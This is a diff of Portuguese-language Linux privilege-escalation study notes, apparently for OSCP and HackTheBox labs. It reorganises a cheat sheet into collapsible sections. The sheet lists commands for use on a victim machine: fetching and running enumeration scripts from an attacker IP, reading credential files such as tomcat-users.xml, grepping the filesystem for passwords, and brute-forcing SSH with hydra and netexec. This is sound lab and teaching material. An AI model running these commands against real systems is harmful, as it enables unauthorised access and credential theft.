@@ -1,9 +1,24 @@
 Linux PrivEsc
 ========================
 
-Seguindo o a mesma premissa do windows, vamos verificar primeiramente o kernel e em sequência gente pode olhar alguns diretórios logo de cara:
+- [ ] [**Sudo access**](#sudo-access)
+- [ ] [**SUID e SGID**](#suid-e-sgid)
+- [ ] [**Exploração de Kernel**](#kernel-exploitation)
+- [ ] [**Checar o histórico de comandos**](#check-history)
+- [ ] [**Navegar nos diretórios**](#navegar-nos-diretorios)
+- [ ] [**Enumerar usuários**](#enumerar-usuarios)
+- [ ] [**Enumeração automática**](#automatizado)
+- [ ] [**Serviços locais**](#local-services)
+- [ ] [**Informações de rede**](#network-information)
+- [ ] [**Tarefas agendadas**](#crontab)
+- [ ] [**Enumeração de processos**](#enumeracao-de-processos)
+- [ ] [**Reutilização de senha**](#reutilizacao-de-senha)
+- [ ] [**Senhas em texto claro**](#senhas-em-texto-claro)
 
+
+<details markdown="1"><summary markdown="1">
 ## Sudo access
+</summary>
 
     sudo -i
     sudo su
@@ -12,8 +27,16 @@ Seguindo o a mesma premissa do windows, vamos verificar primeiramente o kernel e
     # Este temos de verificar os binários que podemos executar com permissão de root
     sudo -l
 
-## SUID e SGID
+### Exemplos práticos
 
+Vide máquina [Broker](../../../CTFs_Labs/HackTheBox/Broker#privesc) : sudo access com o binário nginx
+Vide máquina [Blocky](../../../CTFs_Labs/HackTheBox/Blocky#privilege-escalation)
+
+</details>
+
+<details markdown="1"><summary markdown="1">
+## SUID e SGID
+</summary>
 Com isso podemos executar o arquivo (caso seja um executável) conforme a permissão do dono do arquivo. Ou seja, se o dono do arquivo for root e o SUID bit estiver definido para o binário, podemos realizar a escalação de privilégio.
 
     find / -perm -u=s -type f 2>/dev/null
@@ -21,8 +44,11 @@ Com isso podemos executar o arquivo (caso seja um executável) conforme a permis
     
 Nese ponto podemos abrangeer a análise de binários aqui quando encontramos algo que seja possível ser executado por meio do usuário root. Para isso devemos considerar esta [nota]()
 
-## Kernel exploitation
+</details>
 
+<details markdown="1"><summary markdown="1">
+## Kernel exploitation
+</summary>
 <https://gabb4r.gitbook.io/oscp-notes/linux-post-exploitation/kernel-exploitation>
 
     wget http://10.10.14.17/4-privilege_escalation/les.sh
@@ -42,13 +68,16 @@ Algo importante aqui na hora de escalar privilégios no sistema:
 **Considerar a compilação para sistemas 32 bits**
 
 https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
+</details>
 
+<details markdown="1"><summary markdown="1">
 ## CheckHistory
-
+</summary>
     history
-
+</details>
+<details markdown="1"><summary markdown="1">
 ## Navegar nos diretórios
-
+</summary>
 Aqui alguns detalhes na hora de navegar nos diretórios. Temos que verificar se existem outras aplicações rodando quando temos um apache na máquina alvo, assim como credenciais em seus arquivos de configuração. Vide que é possível obter i8sso por meio dos seguintes arquivos:
 
     cat /opt/tomcat/conf/tomcat-users.xml
@@ -64,14 +93,21 @@ Aqui alguns detalhes na hora de navegar nos diretórios. Temos que verificar se 
 
 
 OS COMANDOS AQUI SÃO EXECUTADOS TODOS NA MÁQUINA VÍTIMA
-
-## Enumerate Users
+</details>
+<details markdown="1"><summary markdown="1">
+## Enumerar usuários
+</summary>
 
     cat /etc/passwd
     #non-system users
     awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
 
-## LinEnum
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Atomatizado
+</summary>
+### Linenum
 
 https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
@@ -83,7 +119,7 @@ ou
 
 https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
 
-## bangenum
+### bangenum
 
 è um resumo do LinEnum.sh
 
@@ -92,11 +128,22 @@ https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
     chmod +x bangenum.sh
     ./bangenum.sh
 
+</details>
+
+<details markdown="1"><summary markdown="1">
 ## Local services
+</summary>
+
+    netstat -natl
+
+ou
 
     netstat -nao
+</details>
 
+<details markdown="1"><summary markdown="1">
 ### Network information
+</summary>
 
     ip a
     ifconfig
@@ -109,7 +156,11 @@ https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
     
     ss -anp
 
-## Crontab (Serviços agendados)
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Crontab
+</summary>
 
     crontab -l
     cat /etc/crontab
@@ -117,7 +168,11 @@ https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
 
     grep "CRON" /var/log/cron.log
 
-## Process Enumeration
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Enumeração de processos
+</summary>
 
 < https://github.com/DominicBreuker/pspy>
 
@@ -127,10 +182,11 @@ https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
     chmod +x pspy64
     ./pspy64
     
+</details>
 
-
-## ReusedPassword
-
+<details markdown="1"><summary markdown="1">
+## Reutilização de senha
+</summary>
 Tentar usuário e senha sendo o mesmo com hydra, por exemplo
 
     hydra -L user.txt -P user.txt 10.10.10.10 ssh
@@ -138,8 +194,17 @@ Tentar usuário e senha sendo o mesmo com hydra, por exemplo
 
 Tentar senha de um usuário para outro também e rockyou
 
-## Credentials from config files
+    netexec ssh <hostname> -u usuarios.txt -p senhas.txt --continue
 
+ou
+
+    netexec ssh <hostname> -u usuarios.txt -p senhas.txt --continue --no-bruteforce
+
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Senhas em texto claro
+</summary>
 Procurar a string PASSWORD ou password dentro de arquivos
 
     grep -rnw / -e 'password\|pass\|creds\|senha\|credentials' 2>/dev/null -i
@@ -164,10 +229,11 @@ In memory passwords
 
 Generally, source code with hard coded credentials. Searcvh for php files, for examplo
 
-## Credentials from local databases
+### Credentials from local databases
 
 Dump de credenciais do banco de dados
 
+</details>
 
 ## SSH keys
 
